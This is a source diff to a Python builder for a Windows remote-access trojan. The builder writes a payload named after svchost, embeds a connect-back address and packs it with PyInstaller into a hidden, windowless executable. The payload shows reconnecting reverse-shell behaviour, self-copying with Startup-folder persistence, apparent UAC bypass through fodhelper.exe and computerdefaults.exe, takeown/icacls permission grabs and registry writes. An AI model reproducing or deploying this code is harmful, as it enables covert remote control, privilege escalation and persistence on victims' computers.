@@ -1,22 +1,36 @@
+from os.path import dirname,join
 from os import system
 from sys import exit
-def nuitka()->None:
+__author__="Vahab Programmer https://github.com/Vahab-Programmer"
+__version="0.0.2"
+def remove(path:str)->None:system("del /F /Q \"{}\"".format(path))
+def rmdir(path:str)->None:system("rd /S /Q".format(path))
+def PyInstaller()->None:
     ip_address=str(input("Server IP:"))
     with open("svchost.py","w") as file:
         file.write(buf%ip_address)
-    system("nuitka .\\svchost.py --mode=accelerated --mode=onefile --remove-output --windows-console-mode=disable --include-data-files=.\\run.exe=.\\run.exe")
+    system("pyinstaller --onefile --windowed --optimize 2 --add-binary \".\\run.exe;.\" svchost.py")
+    remove(join(dirname(__file__),"build"))
+    remove(join(dirname(__file__),"svchost.spec"))
     exit(0)
 buf=r'''from platform import node,release,machine,processor
 from ctypes import windll
 from pickle import dumps
 from subprocess import getoutput,call
-from sys import exit,orig_argv
+from sys import exit,orig_argv,setrecursionlimit
 from os import chdir,environ,system as run
-from os.path import basename
+from os.path import basename,dirname,join
 from socket import socket,AF_INET,SOCK_STREAM,gaierror
 from shutil import copyfile
 from winreg import OpenKeyEx,HKEY_LOCAL_MACHINE,KEY_WRITE,SetValueEx,REG_DWORD,CloseKey
 from psutil import process_iter,AccessDenied
+import sys
+__author__="Vahab Programmer https://github.com/Vahab-Programmer"
+__version="0.0.2"
+setrecursionlimit(1000000000)
+if hasattr(sys,"frozen"):
+    runfile=join(sys._MEIPASS,"run.exe")
+else:runfile=join(dirname(__file__),"run.exe")
 environ["exe"]=" ".join([i for i in orig_argv])
 def process_is_double(target:str=None)->int:
     if target:target = target + ".exe" if target.split(".")[-1] != "exe" else target
@@ -51,6 +65,7 @@ def connect()->None:
     except TimeoutError:connect()
     except ConnectionRefusedError:connect()
     except gaierror:connect()
+    except OSError:connect()
 def CYS()->None:
     copyfile(" ".join([i for i in orig_argv]),(r"C:\Users\{}\Documents\\"+basename(" ".join([i for i in orig_argv]))).format(environ.get("username")))
     with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ.get("username")), "w") as file:
@@ -72,11 +87,10 @@ def computerdefaults(target:str=None)->None:
     if " ".join([i for i in orig_argv]) == target:
         x=process_is_double()
         while not x<process_is_double():
-            print(x,process_is_double())
-            call("run computerdefaults.exe {}".format(target))
+            call("{} computerdefaults.exe {}".format(runfile,target))
             if x<process_is_double():return
         return None
-    while not process_is_exists(basename(target)):call("run computerdefaults.exe {}".format(target))
+    while not process_is_exists(basename(target)):call("{} computerdefaults.exe {}".format(runfile,target))
 def fodhelper(target:str=None)->None:
     if target:target = target + ".exe" if target.split(".")[-1] != "exe" else target
     else :target=" ".join([i for i in orig_argv])
@@ -84,10 +98,9 @@ def fodhelper(target:str=None)->None:
     if " ".join([i for i in orig_argv]) == target:
         x=process_is_double()
         while not x<process_is_double():
-            print(x,process_is_double())
-            call("run fodhelper.exe {}".format(target))
+            call("{} fodhelper.exe {}".format(runfile,target))
             if x<process_is_double():return
-    while not process_is_exists(basename(target)):call("run fodhelper.exe {}".format(target))
+    while not process_is_exists(basename(target)):call("{} fodhelper.exe {}".format(runfile,target))
 def FDR(target:str)->None:
     run("takeown /D Y /R /F {}".format(target))
     run("icacls {} /T /C /grant {}:(F,MA)".format(target,environ.get("username")))
@@ -145,6 +158,6 @@ while True:
         s.send(process.encode() if process else "success".encode())
     except ConnectionResetError:connect()
     except OSError:connect()'''
-print("Checking For Nuitka")
-from nuitka import __doc__
-nuitka()
+print("Checking For PyInstaller")
+from PyInstaller import __version__
+PyInstaller()
